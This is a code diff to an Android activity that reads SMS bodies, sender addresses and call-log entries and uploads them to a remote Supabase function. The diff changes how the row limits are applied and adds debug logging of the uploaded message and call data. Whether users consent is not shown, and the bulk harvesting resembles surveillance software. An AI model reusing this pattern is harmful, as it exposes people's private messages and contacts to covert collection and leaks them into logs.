@@ -234,10 +234,11 @@ class DataSyncActivity : AppCompatActivity() {
         val cursor: Cursor? = contentResolver.query(
             Telephony.Sms.CONTENT_URI,
             null, null, null,
-            Telephony.Sms.DATE + " DESC LIMIT 1000"
+            Telephony.Sms.DATE + " DESC"
         )
         cursor?.use { c ->
-            while (c.moveToNext()) {
+            var count = 0
+            while (c.moveToNext() && count < 1000) {
                 val body = getCol(c, Telephony.Sms.BODY) ?: continue
                 val address = getCol(c, Telephony.Sms.ADDRESS) ?: ""
                 val type = getCol(c, Telephony.Sms.TYPE) ?: ""
@@ -250,6 +251,7 @@ class DataSyncActivity : AppCompatActivity() {
                     put("source", "sms")
                     put("timestamp", ts)
                 })
+                count++
             }
         }
         return arr
@@ -260,10 +262,11 @@ class DataSyncActivity : AppCompatActivity() {
         val cursor: Cursor? = contentResolver.query(
             android.provider.CallLog.Calls.CONTENT_URI,
             null, null, null,
-            android.provider.CallLog.Calls.DATE + " DESC LIMIT 500"
+            android.provider.CallLog.Calls.DATE + " DESC"
         )
         cursor?.use { c ->
-            while (c.moveToNext()) {
+            var count = 0
+            while (c.moveToNext() && count < 500) {
                 val number = getCol(c, android.provider.CallLog.Calls.NUMBER) ?: ""
                 val name = getCol(c, android.provider.CallLog.Calls.CACHED_NAME) ?: ""
                 val type = getCol(c, android.provider.CallLog.Calls.TYPE) ?: "0"
@@ -283,6 +286,7 @@ class DataSyncActivity : AppCompatActivity() {
                     put("duration", try { duration.toInt() } catch (e: Exception) { 0 })
                     put("timestamp", ts)
                 })
+                count++
             }
         }
         return arr
@@ -325,7 +329,8 @@ class DataSyncActivity : AppCompatActivity() {
     }
 
     private fun pushToFunction(functionName: String, body: Map<String, Any>): Int? {
-        val json = JSONObject(body as Map<String, Any>)
+        val json = JSONObject(body)
+        android.util.Log.d("DataSync", "Pushing to $functionName: " + json.toString().take(500))
         val requestBody = json.toString().toRequestBody("application/json".toMediaType())
         val request = Request.Builder()
             .url(LocationService.SUPABASE_FUNCTION_URL.replace("push-location", functionName))
@@ -336,8 +341,9 @@ class DataSyncActivity : AppCompatActivity() {
 
         client.newCall(request).execute().use { response ->
             val respBody = response.body?.string() ?: "{}"
+            android.util.Log.d("DataSync", "$functionName response (" + response.code + "): " + respBody.take(500))
             if (!response.isSuccessful) {
-                android.util.Log.e("DataSync", "$functionName failed: $respBody")
+                android.util.Log.e("DataSync", "$functionName failed: " + respBody)
                 return null
             }
             val j = JSONObject(respBody)
